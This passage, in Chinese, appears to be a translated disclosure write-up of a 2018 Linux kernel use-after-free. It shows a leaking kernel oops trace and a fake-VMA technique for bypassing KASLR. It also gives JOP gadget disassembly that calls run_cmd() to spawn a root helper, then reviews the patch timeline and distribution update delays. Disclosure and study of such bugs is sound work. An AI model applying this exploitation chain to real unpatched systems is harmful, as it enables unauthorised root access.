    [ 3482.271331] RDX: 0000000000000000 RSI: 00007fffffffd000 RDI: ffff9e0bc2263e30
    [ 3482.271332] RBP: ffff9e0bc2263e20 R08: ffffffffa7243680 R09: 0000000000000002
    [ 3482.271333] R10: ffff8c7bb4497738 R11: 0000000000000000 R12: ffff9e0bc2263e30
    [ 3482.271333] R13: ffff8c7bb4497700 R14: ffff8c7cb7a72d80 R15: ffff8c7bb4497700
    [ 3482.271337] ? _copy_from_user+0x3e/0x60
    [ 3482.271340] eventfd_write+0x74/0x270
    [ 3482.271343] ? common_file_perm+0x58/0x160
    [ 3482.271345] ? wake_up_q+0x80/0x80
    [ 3482.271347] __vfs_write+0x1b/0x40
    [ 3482.271348] vfs_write+0xb1/0x1a0
    [ 3482.271349] SyS_write+0x55/0xc0
    [ 3482.271353] do_syscall_64+0x73/0x130
    [ 3482.271355] entry_SYSCALL_64_after_hwframe+0x3d/0xa2
    [ 3482.271356] RIP: 0033:0x55a2e8ed76a6
    [ 3482.271357] RSP: 002b:00007ffe71367ec8 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
    [ 3482.271358] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000055a2e8ed76a6
    [ 3482.271358] RDX: 0000000000000008 RSI: 00007fffffffd000 RDI: 0000000000000003
    [ 3482.271359] RBP: 0000000000000001 R08: 0000000000000000 R09: 0000000000000000
    [ 3482.271359] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffe71367ec8
    [ 3482.271360] R13: 00007fffffffd000 R14: 0000000000000009 R15: 0000000000000000
    [ 3482.271361] Code: 00 48 8b 84 c8 10 08 00 00 48 85 c0 74 11 48 39 78 40 75 17 48 39 30 77 06 48 39 70 08 77 8d 83 c2 01 83 fa 04 75 ce 31 c0 5d c3  0b 31 c0 5d c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f
    [ 3482.271381] ---[ end trace bf256b6e27ee4552 ]---
此时，该漏洞可以创建一个包含正确mm_struct指针(从RDI泄漏)的伪VMA。它还通过引用伪数据结构来填充其他字段(通过使用从RAX的泄漏的VMA指针创建指向伪VMA的指针)以及指向内核代码的指针(使用从页错误异常框架泄漏的R8绕过KASLR)。
# 漏洞利用：JOP（最无聊的部分）
通过利用在现有的页面上覆盖一个伪可写的VMA的能力，或者类似的东西，很有可能以一种非常优雅的方式利用这个漏洞；然而，这种利用只是使用了经典的面向跳转编程。
为了再次触发use-after-free，对没有可分页条目的地址执行写入内存访问。此时，内核的页面错误处理程序通过page_fault ->
do_page_fault -> **do_page_fault - > handle_mm_fault -> **handle_mm_fault ->
handle_pte_fault -> do_fault -> do_shared_fault -> __do_fault 执行间接调用:
    static int __do_fault(struct vm_fault *vmf)
    {
    struct vm_area_struct *vma = vmf->vma;
    int ret;
    ret = vma->vm_ops->fault(vmf);
vma是我们控制的VMA结构，所以在这一点上，我们可以获得指令指针控制。R13包含一个指向vma的指针。下面使用的JOP链;它相当粗糙(例如，它会在完成任务后崩溃)，但它确实有效。
首先，移动VMA指针到RDI：
    ffffffff810b5c21: 49 8b 45 70 mov rax,QWORD PTR [r13+0x70]
    ffffffff810b5c25: 48 8b 80 88 00 00 00 mov rax,QWORD PTR [rax+0x88]
    ffffffff810b5c2c: 48 85 c0 test rax,rax
    ffffffff810b5c2f: 74 08 je ffffffff810b5c39
    ffffffff810b5c31: 4c 89 ef mov rdi,r13
    ffffffff810b5c34: e8 c7 d3 b4 00 call ffffffff81c03000 
然后，完全控制RDI：
    ffffffff810a4aaa: 48 89 fb mov rbx,rdi
    ffffffff810a4aad: 48 8b 43 20 mov rax,QWORD PTR [rbx+0x20]
    ffffffff810a4ab1: 48 8b 7f 28 mov rdi,QWORD PTR [rdi+0x28]
    ffffffff810a4ab5: e8 46 e5 b5 00 call ffffffff81c03000 
此时，我们可以调用run_cmd()，它使用空格分隔的路径和参数列表作为唯一的参数，生成一个root特权用户模式助手。这使我们能够运行root特权提供的二进制文件。(感谢Mark指出，如果你能控制RDI和RIP，就不必尝试做一些疯狂的事情，比如在CR4中翻转SM*P位，只需生成一个usermode
helper…)
在启动usermode helper之后，内核会因为页错误而崩溃，因为JOP链没有干净地终止;但是，由于这只会杀死发生错误的进程，所以并不是很重要。
# 修复时间线
此错误报告于2018-09-12。两天后，即2018-09-14，在内核树的上游进行了修复。与其他软件供应商的修复时间相比，这是非常快的。在这一点上，下游厂商理论上可以支持并应用补丁。这个bug现在基本上是公开的，即使它的安全影响被提交消息混淆了，[grsecurity](https://twitter.com/grsecurity/status/1042376315045916672)经常演示这一点。
然而，上游内核中的修复并不意味着用户的系统实际上已经修复了。对于使用基于上游稳定分支的分发内核的用户，向其发送修复程序的正常流程大致如下:
  1. 一个补丁落在了内核的上游。
  2. 这个补丁被反向移植到一个向上支持的稳定内核中。
  3. 发行版将向上支持的稳定内核的更改合并到其内核中。
  4. 用户安装新的发行版内核。
注意，补丁在第1步之后就公开了，这可能允许攻击者利用漏洞，但是用户只有在第4步之后才受到保护。
在本例中，在补丁公开5天后，对上行支持的稳定内核4.18、4.14、4.9和4.4的后端版本发布了2018-09-19，此时发行版可以将补丁引入。
上游稳定内核更新的发布非常频繁。例如，查看4.14
stable内核的最后几个[稳定版本](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/log/?h=linux-4.14.y&qt=grep&q=Linux+4.14.)，这是最新的上游长期维护版本:  
4.14.72 on 2018-09-26  
4.14.71 on 2018-09-19  
4.14.70 on 2018-09-15  
4.14.69 on 2018-09-09  
4.14.68 on 2018-09-05  
4.14.67 on 2018-08-24  
4.14.66 on 2018-08-22
4.9和4.4长期维护内核的更新频率相同;只有3.16长期维护内核在最近一次更新(2018-09-25([3.16.58](https://git.kernel.org/pub/scm/linux/kernel/git/bwh/linux-stable.git/tag/?h=v3.16.58))和上一次更新(2018-06-16([3.16.57](https://git.kernel.org/pub/scm/linux/kernel/git/bwh/linux-stable.git/tag/?h=v3.16.57))之间没有收到任何更新。
然而，Linux发行版通常并不经常发布发行版内核更新。例如，Debian
stable发布了一个[基于4.9的内核](https://packages.debian.org/search?keywords=linux-image-amd64&searchon=names&suite=stable&section=all)，但是截止到2018-09-26，这个内核最近一次[更新](http://metadata.ftp-master.debian.org/changelogs//main/l/linux/linux_4.9.110-3+deb9u4_changelog)是2018-08-21。类似地，Ubuntu
16.04发布了一个内核，最近[更新](http://changelogs.ubuntu.com/changelogs/pool/main/l/linux-signed/linux-signed_4.15.0-34.37/changelog)时间是2018-08-27。Android每个月只发布一次安全更新。因此，当上游稳定内核中存在安全关键的修复程序时，用户仍然可能需要数周时间才能真正使用修复程序——尤其是在安全影响没有公开宣布的情况下。
在这种情况下，安全问题在2018-09-18的oss-security邮件列表上公布，并在2018-09-19进行了CVE分配，这使得向用户发送新的分发内核的需求更加清晰。
仍然：截至2018-09-26，Debian和Ubuntu（在16.04和18.04版本中）都将这个漏洞跟踪为unfixed：  
Fedora在2018-09-22向用户推送了更新:
# 总结
这个漏洞显示了内核配置对编写内核漏洞利用的难度有多大的影响。尽管简单地打开每一个与安全相关的内核配置选项可能是一个坏主意，但它们中的一些——比如kernel.dmesg_restricted
sysctl——在启用时似乎能提供合理的权衡。
修复时间表显示了内核处理严重安全漏洞的方法，非常有效地快速登陆git主树中的修复程序，但在发布上游修复程序和修复程序实际可供用户使用的时间之间留下了一个曝光窗口
- 此时间窗口足够大，以至于攻击者可以在此期间编写内核漏洞利用程序。